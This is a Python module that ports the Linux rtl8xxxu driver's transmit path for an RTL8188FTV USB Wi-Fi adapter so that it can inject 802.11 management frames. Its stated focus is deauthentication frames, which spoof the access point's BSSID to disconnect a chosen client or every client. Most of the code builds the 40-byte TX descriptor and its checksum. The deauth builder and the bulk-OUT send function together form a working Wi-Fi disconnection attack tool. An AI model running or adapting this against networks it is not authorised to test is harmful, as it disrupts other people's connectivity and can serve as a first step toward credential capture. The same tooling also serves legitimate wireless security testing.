"""RTL8188FTV TX path — MGMT-frame inject (deauth).

Cleanroom port of:

* `struct rtl8xxxu_txdesc40`     — `rtl8xxxu.h:414-430` (40-byte descriptor)
* `rtl8xxxu_tx` setup tail       — `core.c:5530-5565` (txdw0, pkt_offset, queue)
* `rtl8xxxu_fill_txdesc_v2` MGMT — `core.c:5340-5406` (8188f's fill, 8188f.c:1735)
* `rtl8xxxu_calc_tx_desc_csum`   — `core.c:5128-5141` (XOR-16 over the desc)

Scope: management-frame injection (deauth in particular). Data frames,
aggregation, and TX-report consumption are out of scope.  Unlike the 8188eus
v3 fill, the v2 fill sets NO antenna-select bits.

Wire layout of a sent URB:

    [40-byte txdesc40]  [MPDU bytes — typically 26 for a deauth]

The chip computes the actual on-air FCS; we don't append one.
"""
from __future__ import annotations

import logging
import struct
from typing import Sequence

import usb.core

from .constants import (
    FC0_SUBTYPE_DEAUTH,
    FC0_TYPE_MGMT,
    REASON_CODE_CLASS3_FRAME,
    TX_DESC_SZ_8188F,
    TXDESC40_AGG_BREAK,
    TXDESC40_RETRY_LIMIT_ENABLE,
    TXDESC40_RETRY_LIMIT_MGNT,
    TXDESC40_RETRY_LIMIT_SHIFT,
    TXDESC40_SEQ_SHIFT,
    TXDESC40_USE_DRIVER_RATE,
    TXDESC_BROADMULTICAST,
    TXDESC_FIRST_SEGMENT,
    TXDESC_LAST_SEGMENT,
    TXDESC_OWN,
    TXDESC_QUEUE_MGNT,
    TXDESC_QUEUE_SHIFT,
)

logger = logging.getLogger(__name__)


def pick_bulk_out_mgmt(bulk_out_eps: Sequence[int]) -> int:
    """Pick the bulk-OUT endpoint that the MGMT queue routes to.

    Mirrors the kernel's `priv->pipe_out[TXDESC_QUEUE_MGNT] =
    priv->out_ep[mgp=0]` (core.c:2685): the FIRST bulk-OUT endpoint
    (lowest address) maps to the HIGH lane which carries MGMT.
    """
    if not bulk_out_eps:
        raise RuntimeError("no bulk-OUT endpoints found on this device")
    return min(bulk_out_eps)


# ---- frame builders -------------------------------------------------


def build_deauth(bssid: bytes, client: bytes, reason: int = REASON_CODE_CLASS3_FRAME) -> bytes:
    """Build a 26-byte 802.11 Deauthentication frame (subtype 0xC).

    Frame layout (802.11-2020 9.3.3.13):

        | fc[2] | duration[2] | addr1=client[6] | addr2=bssid[6] | addr3=bssid[6] | seq[2] | reason[2] |

    - `addr1` is the destination (client being kicked, or `ff:..:ff` for bcast).
    - `addr2` is the source — we pretend to be the AP, so this is BSSID.
    - `addr3` is BSSID (mandatory in MGMT frames).
    - Sequence number is left at 0; a fresh one is stamped per inject.
    """
    if len(bssid) != 6:
        raise ValueError(f"bssid must be 6 bytes, got {len(bssid)}")
    if len(client) != 6:
        raise ValueError(f"client must be 6 bytes, got {len(client)}")
    fc0 = FC0_TYPE_MGMT | FC0_SUBTYPE_DEAUTH
    return struct.pack(
        "<BBH6s6s6sHH",
        fc0,           # fc[0]
        0x00,          # fc[1]: ToDS=0, FromDS=0, no flags
        0x013A,        # Duration: 314 µs (typical mgmt frame duration value)
        client,        # addr1: destination
        bssid,         # addr2: source (we spoof the AP)
        bssid,         # addr3: BSSID
        0,             # seq_ctrl (fresh per inject)
        reason,        # body: reason code
    )


# ---- descriptor builder ---------------------------------------------


def build_tx_desc_mgmt(pkt_len: int, is_broadcast: bool, *,
                       seq: int = 0,
                       retry_limit: int = TXDESC40_RETRY_LIMIT_MGNT) -> bytearray:
    """Construct a 40-byte tx descriptor for a MGMT frame.

    Mirrors `rtl8xxxu_tx` (core.c:5530-5565) for the common header +
    `rtl8xxxu_fill_txdesc_v2` MGMT branch (core.c:5340-5406).  `seq` is the
    frame's SN (bits 15-4 of seq_ctrl), mirrored into txdw9 (core.c:5370);
    `retry_limit` fills the txdw4 retry-limit field (default 6, the vendor
    MGMT value). Checksum is NOT computed here — caller must call
    `calc_tx_desc_csum` on the finished descriptor (csum field cleared first).
    """
    desc = bytearray(TX_DESC_SZ_8188F)

    # Common header:
    #   pkt_size = MPDU length          (bytes 0-1, LE u16)
    #   pkt_offset = descriptor size    (byte 2, u8)
    #   txdw0 = OWN | FIRST_SEG | LAST_SEG  (byte 3, u8)
    struct.pack_into("<H", desc, 0, pkt_len)
    desc[2] = TX_DESC_SZ_8188F
    txdw0 = TXDESC_OWN | TXDESC_FIRST_SEGMENT | TXDESC_LAST_SEGMENT
    if is_broadcast:
        txdw0 |= TXDESC_BROADMULTICAST
    desc[3] = txdw0

    # txdw1: queue = MGNT (0x12) shifted into bits[12:8].  macid (bits 0-6)
    # is 0 — monitor inject has no station entry.
    txdw1 = TXDESC_QUEUE_MGNT << TXDESC_QUEUE_SHIFT
    struct.pack_into("<I", desc, 4, txdw1)

    # txdw2: AGG_BREAK (we're not aggregating).  fill_txdesc_v2 sets NO
    # antenna-select bits (unlike v3 on the 8188eus) — core.c:5380-5382.
    txdw2 = TXDESC40_AGG_BREAK
    struct.pack_into("<I", desc, 8, txdw2)

    # txdw3: USE_DRIVER_RATE (MGMT branch — core.c:5381)
    txdw3 = TXDESC40_USE_DRIVER_RATE
    struct.pack_into("<I", desc, 12, txdw3)

    # txdw4: rate=0 (1Mbps CCK — most robust), retry limit + enable
    # (core.c:5382-5384)
    txdw4 = (
        ((retry_limit & 0x3F) << TXDESC40_RETRY_LIMIT_SHIFT)
        | TXDESC40_RETRY_LIMIT_ENABLE
    )
    struct.pack_into("<I", desc, 16, txdw4)

    # txdw5, txdw6: 0 (unused for MGMT; short preamble / aggregation off)

    # csum at bytes 28-29 — left 0 here, filled by calc_tx_desc_csum.

    # txdw7 (bytes 30-31): 0 — no antenna-select for v2.

    # txdw8: HW_SEQ_ENABLE cleared — SW prints the sequence number into the
    # MPDU, txdw9 mirrors it (core.c:5372-5374, 5387-5389).
    # txdw9 (bytes 36-39): SN mirrored from the frame (core.c:5370).
    txdw9 = (seq & 0xFFF) << TXDESC40_SEQ_SHIFT
    struct.pack_into("<I", desc, 36, txdw9)

    return desc


def calc_tx_desc_csum(desc: bytearray) -> None:
    """Port of `rtl8xxxu_calc_tx_desc_csum` (core.c:5128-5141).

    XOR-16 over the 40-byte descriptor with the `csum` field (bytes
    28-29) cleared first, result stored back into csum bytes.
    """
    desc[28] = 0
    desc[29] = 0
    csum = 0
    for i in range(0, TX_DESC_SZ_8188F, 2):
        csum ^= int.from_bytes(desc[i : i + 2], "little")
    csum &= 0xFFFF
    desc[28] = csum & 0xFF
    desc[29] = (csum >> 8) & 0xFF


# ---- bulk-OUT send --------------------------------------------------


def send_mgmt_frame(
    dev: usb.core.Device,
    ep_out: int,
    mpdu: bytes,
    *,
    is_broadcast: bool = False,
    retry_limit: int = TXDESC40_RETRY_LIMIT_MGNT,
    timeout_ms: int = 200,
) -> int:
    """Send a single MGMT frame: build descriptor, checksum, bulk-OUT write.

    `retry_limit` is threaded into the TX descriptor's retry-limit field
    (default 6).  Returns the number of bytes actually written (descriptor +
    MPDU).  Raises `usb.core.USBError` on USB-level failure (e.g. timeout,
    pipe stall, no device).
    """
    frame_seq = ((mpdu[22] | (mpdu[23] << 8)) >> 4) & 0xFFF if len(mpdu) >= 24 else 0
    desc = build_tx_desc_mgmt(len(mpdu), is_broadcast, seq=frame_seq,
                              retry_limit=retry_limit)
    calc_tx_desc_csum(desc)
    urb = bytes(desc) + mpdu
    written = dev.write(ep_out, urb, timeout_ms)
    if written != len(urb):
        raise IOError(
            f"bulk-OUT short write: sent {written}, expected {len(urb)}"
        )
    return written